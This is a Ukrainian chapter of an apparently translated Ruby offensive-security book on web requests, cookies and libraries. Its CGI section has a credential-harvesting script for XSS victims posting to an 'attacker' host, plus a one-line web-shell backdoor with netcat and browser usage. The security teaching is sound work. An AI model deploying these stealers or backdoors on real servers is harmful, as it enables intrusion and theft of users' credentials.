# Розділ 0x4 | Кунг-Фу Тенет

## Надсилання GET запиту

### використовуючи Net::HTTP
```ruby
#!/usr/bin/env ruby
# KING SABRI
# Usage | ruby send_get.rb [HOST] [SESSION_ID]
#
require "net/http"

host       = ARGV[0] || "172.16.50.139"
session_id = ARGV[1] || "3c0e9a7edfa6682cb891f1c3df8a33ad"

def send_sqli(query)

  uri = URI.parse("https://#{host}/script/path/file.php?")
  uri.query = URI.encode_www_form({"var1"=> "val1",
                                   "var2"=> "val2",
                                   "var3"=> "val3"})

  http = Net::HTTP.new(uri.host, uri.port)
  http.use_ssl = true if uri.scheme == 'https'    # Enable HTTPS support if it's HTTPS

  request = Net::HTTP::Get.new(uri.request_uri)
  request["User-Agent"] = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:39.0) Gecko/20100101 Firefox/39.0"
  request["Connection"] = "keep-alive"
  request["Accept-Language"] = "en-US,en;q=0.5"
  request["Accept-Encoding"] = "gzip, deflate"
  request["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
  request["PHPSESSID"] = session_id

  begin
    puts "Sending.. "
    response = http.request(request).body
  rescue Exception => e
    puts "[!] Failed!"
    puts e
  end

end
```

#### Видобувач посилання з короткого посилання 

**urlextractor.rb**
```ruby
#!/usr/bin/env ruby 
require 'net/http'
uri = ARGV[0]
loop do 
  puts uri
  res = Net::HTTP.get_response URI uri
  if !res['location'].nil?
    uri = res['location']
  else
    break
  end
end
```
Запустіть:
```bash
$ruby redirect.rb http://bit.ly/1JSs7vj
http://bit.ly/1JSs7vj
http://ow.ly/XLGfi
https://tinyurl.com/hg69vgm
http://rubyfu.net
```

Добре, а що якщо я дам вам наступне скорочене посилання(`http://short-url.link/f2a`)? Спробуйте вищенаведений скрипт і розкажіть мені що відбулося.


### Використовуючи Open-uri
Ось інший спосіб зробити те саме: 
```ruby
#!/usr/bin/env ruby
require 'open-uri'
require 'openssl'

host       = ARGV[0] || "172.16.50.139"
session_id = ARGV[1] || "3c0e9a7edfa6682cb891f1c3df8a33ad"


def send_sqli
  uri = URI.parse("https://#{host}/script/path/file.php?var1=val1&var2=val2&var3=val3")
  headers = 
      {
        "User-Agent" => "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:39.0) Gecko/20100101 Firefox/39.0",
        "Connection" => "keep-alive",
        "Accept-Language" => "en-US,en;q=0.5",
        "Accept-Encoding" => "gzip, deflate",
        "Accept" => "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Cookie" => "PHPSESSID=#{session_id}"
      }
  request = open(uri, :ssl_verify_mode => OpenSSL::SSL::VERIFY_NONE, headers)
  puts "Sending.. "
  response = request.read
  puts response
end
```

## Відправлення HTTP Post запит з довільними заголовками
Ось тіло post запиут з файлу:
```ruby
require 'net/http'

uri = URI.parse "http://example.com/Pages/PostPage.aspx"
headers =
{
   'Referer' => 'http://example.com/Pages/SomePage.aspx',
   'Cookie' => 'TS9e4B=ae79efe; WSS_FullScrende=false; ASP.NET_SessionId=rxuvh3l5dam',
   'Connection' => 'keep-alive',
   'Content-Type' =>'application/x-www-form-urlencoded'
 }
post = File.read post_file   # Raw Post Body's Data
http    = Net::HTTP.new(uri.host, uri.port)
http.use_ssl = true if uri.scheme == 'https'    # Enable HTTPS support if it's HTTPS
request = Net::HTTP::Post.new(uri.path, headers)
request.body = post
response = http.request request
puts response.code
puts response.body
```

## Більше влади над змінними в Post реквесті
Давайте візьмемо наступну форму і спробуємо відтворити те, що браузер відправить на сервер:

| ![PostForm](../images/module04/webfu__post_form1.png) |
|:---------------:|
| **Картинка 1.** Проста Post форма |

Post запит з коду:
```html
<FORM METHOD=POST ACTION="http://wwwx.cs.unc.edu/~jbs/aw-wwwp/docs/resources/perl/perl-cgi/programs/cgi_stdin.cgi">

    <P>Name field: <INPUT TYPE="text" Name="name" SIZE=30 VALUE = "You name">
    <P>Name field: <TEXTAREA TYPE="textarea" ROWS=5 COLS=30 Name="textarea">Your comment.</TEXTAREA>

    <P>Your age: <INPUT TYPE="radio" NAME="radiobutton" VALUE="youngun"> younger than 21,
    <INPUT TYPE="radio" NAME="radiobutton" VALUE="middleun" CHECKED> 21 -59,
    <INPUT TYPE="radio" NAME="radiobutton" VALUE="oldun"> 60 or older

    <P>Things you like:
    <INPUT TYPE="checkbox" NAME="checkedbox" VALUE="pizza" CHECKED>pizza,
    <INPUT TYPE="checkbox" NAME="checkedbox" VALUE="hamburgers" CHECKED>hamburgers,
    <INPUT TYPE="checkbox" NAME="checkedbox" VALUE="spinich">spinich,
    <INPUT TYPE="checkbox" NAME="checkedbox" VALUE="mashed potatoes" CHECKED>mashed potatoes

    <P>What you like most:
    <SELECT NAME="selectitem">
        <OPTION>pizza<OPTION>hamburgers<OPTION SELECTED>spinich<OPTION>mashed potatoes<OPTION>other
    </SELECT>

    <P>Reset: <INPUT TYPE="reset" >

    <P>Submit: <INPUT TYPE="submit" NAME="submitbutton" VALUE="Do it!" ACTION="SEND">
</FORM>

```
Нам потрібно відправити Post запит такий самий, який би відправила форма з нашої картинки
```ruby
require "net/http"
require "uri"

# Parsing the URL and instantiate http
uri = URI.parse("http://wwwx.cs.unc.edu/~jbs/aw-wwwp/docs/resources/perl/perl-cgi/programs/cgi_stdin.cgi")
http = Net::HTTP.new(uri.host, uri.port)
http.use_ssl = true if uri.scheme == 'https'    # Enable HTTPS support if it's HTTPS

# Instantiate HTTP Post request
request = Net::HTTP::Post.new(uri.request_uri)

# Headers
request["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
request["User-Agent"] = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:37.0) Gecko/20100101 Firefox/37.0"
request["Referer"] = "http://www.cs.unc.edu/~jbs/resources/perl/perl-cgi/programs/form1-POST.html"
request["Connection"] = "keep-alive"
request["Accept-Language"] = "en-US,en;q=0.5"
request["Accept-Encoding"] = "gzip, deflate"
request["Content-Type"] = "application/x-www-form-urlencoded"

# Post body
request.set_form_data({
                          "name"         => "My title is here",
                          "textarea"     => "My grate message here.",
                          "radiobutton"  => "middleun",
                          "checkedbox"   => "pizza",
                          "checkedbox"   => "hamburgers",
                          "checkedbox"   => "mashed potatoes",
                          "selectitem"   => "hamburgers",
                          "submitbutton" => "Do it!"
                      })

# Receive the response
response = http.request(request)

puts "Status code: " + response.code
puts "Response body: " + response.body

```


## Робота з Cookies
Іноді вам потрібно буде щось робити вже після аутентифікації. В ідеалі це все буде пов'язано з cookies
Увага: 
- Щоб прочитати cookies вам потрібно отримати **set-cookie** з **response**
- Щоб встановити cookies треба встановити  **Cookie** в **request** 


```ruby
puts "[*] Logging-in"
uri1 = URI.parse("http://host/login.aspx")
uri2 = URI.parse("http://host/report.aspx")

Net::HTTP.start(uri1.host, uri1.port) do |http|
  http.use_ssl = true if uri1.scheme == 'https'    # Enable HTTPS support if it's HTTPS
  puts "[*] Logging in"
  p_request  = Net::HTTP::Post.new(uri1)
  p_request.set_form_data({"loginName"=>"admin", "password"=>"P@ssw0rd"})
  p_response = http.request(p_request)
  cookies    = p_response.response['set-cookie']	# Save Cookies
  
  puts "[*] Do Post-authentication actions"
  Net::HTTP::Get.new(uri2)
  g_request  = Net::HTTP::Get.new(uri2)
  g_request['Cookie'] = cookies                     # Restore Saved Cookies
  g_response = http.request(g_request)
end
```


## CGI
### Отримання інформації - використовуючи XSS/HTMLi експлуатацію

При використанні XSS чи HTML ін'єкції, вам може знадобитися можливість відправки відфільтрованих даних від заламаного користувач на ваш сервер. Ось приклад простого CGI скрипта, що показує фальшиву форму входу яка просить користувача зайти в систему використовуючи логін та пароль, й потім зберігає введені данні в файл `hacked_login.txt` та міняє права доступу на нього, аби бти впевненими, що більш ніхто не має досутпу до нього.

Додайте наступний код до `/etc/apache2/sites-enabled/[SITE]` та перезавантажте сервіс.
```
<Directory /var/www/[CGI FOLDER]>
        AddHandler cgi-script .rb
        Options +ExecCGI
</Directory>
```
Далі, покладіть скрипт в папку /var/www/[CGI FOLDER]. І тепер ви можете користатися ним:

```ruby
#!/usr/bin/ruby
# CGI script gets user/pass | http://attacker/info.rb?user=USER&pass=PASS
require 'cgi'
require 'uri'

cgi  = CGI.new
cgi.header  # content type 'text/html'
user = URI.encode cgi['user']
pass = URI.encode cgi['pass']
time = Time.now.strftime("%D %T")

file = 'hacked_login.txt'
File.open(file, "a") do |f|
  f.puts time   # Time of receiving the get request
  f.puts "#{URI.decode user}:#{URI.decode pass}"    # The data
  f.puts cgi.remote_addr    # Remote user IP
  f.puts cgi.referer    # The vulnerable site URL
  f.puts "---------------------------"
end
File.chmod(0200, file)  # To prevent public access to the log file

puts ""
```

### Web Shell[^1] - Запускач команд за допомогою GET запитів

Якщо у вас є сервер, що підтримує ruby CGI, ви можете використовувати наступний бекдор:

```ruby
#!/usr/bin/env ruby
require 'cgi'
cgi = CGI.new
puts cgi.header
system(cgi['cmd'])
```
Тепер ви можете використовувати ваш переглядач тенет або WebShellConsole[^1] для запуску потрібних вам команд.

Наприклад.:
**Переглядач тенет**
```
http://host/cgi/shell.rb?cmd=ls -la
```
**Netcat**
```
echo "GET /cgi/shell.rb?cmd=ls%20-la" | nc host 80
```
**WebShellConsole**

Запустіть wsc
```
ruby wsc.rb
```
Додайте URL до вашого webshell-у
```
Shell -> set http://host/cgi/shell.rb?cmd=
```
тепер введіть потрібні вам команди:

```
Shell -> ls -la
```

## Mechanize
Оскількки ми маємо справу з тенетами та рубі, ми не можемо забувати про гем **Mechanize** - найвідоміша бібліотека для работи з тенетами.

**З офіційного опису програми** - бібліотека Mechanize використовується для роботи з вебсайтами. Mechanize автоматично зберігає та відправляє кукі, працює з перенаправленнями та може переходити за посиланнями та відправляти форми. Поля введення в формі можуть бути заповненими та відправленими. Також, Mechanize може зберігати історію перегляду та переходів по сайтам.

Більше інформації пол гем Mechanize
- [Початок роботи з Mechanize][3]
- [Приклади роботи з Mechanize examples][4]
- [RailsCasts | посібник Mechanize ][5]

Оскілки ви вже знаєте як працювати з тенетами більш детально, робота з Mechanize вам здасться дуже простою - просто клікаємо і отримуємо результат. Спробуйте!


## HTTP.rb
HTTP (Це гем! ще відомий як http.rb) - дуже проста для використання бібліотека для виконання запитів з Рубі програм. Вона впроваджує систему ланцюжкового виклику команд, для побудови запитів, схоже до запитів в Python.

В середині, http.rb використовує http_parser.rb - швидкий парсер HTTP що базується на Node.js та порті з Java. Ця бібліотека - це не просто зе одна обгортка для Net::HTTP. Вона реалізує HTTP протокол

Більше про гем http.rb
- [Офіційне git сховище][6]
- [Офіційна документація][7]

<br><br><br>
---
[^1]: [WebShellConsole](https://github.com/KINGSABRI/WebShellConsole) is simple interactive console, interacts with simple web shells using HTTP GET rather than using browser. wsc will work with any shell use GET method. It takes care of all URL encoding too.
- [CGI Examples](http://www.java2s.com/Code/Ruby/CGI/CatalogCGI.htm)
[3]: http://docs.seattlerb.org/mechanize/GUIDE_rdoc.html
[4]: http://docs.seattlerb.org/mechanize/EXAMPLES_rdoc.html
[5]: http://railscasts.com/episodes/191-mechanize
[6]: https://github.com/httprb/http
[7]: https://github.com/httprb/http/wiki














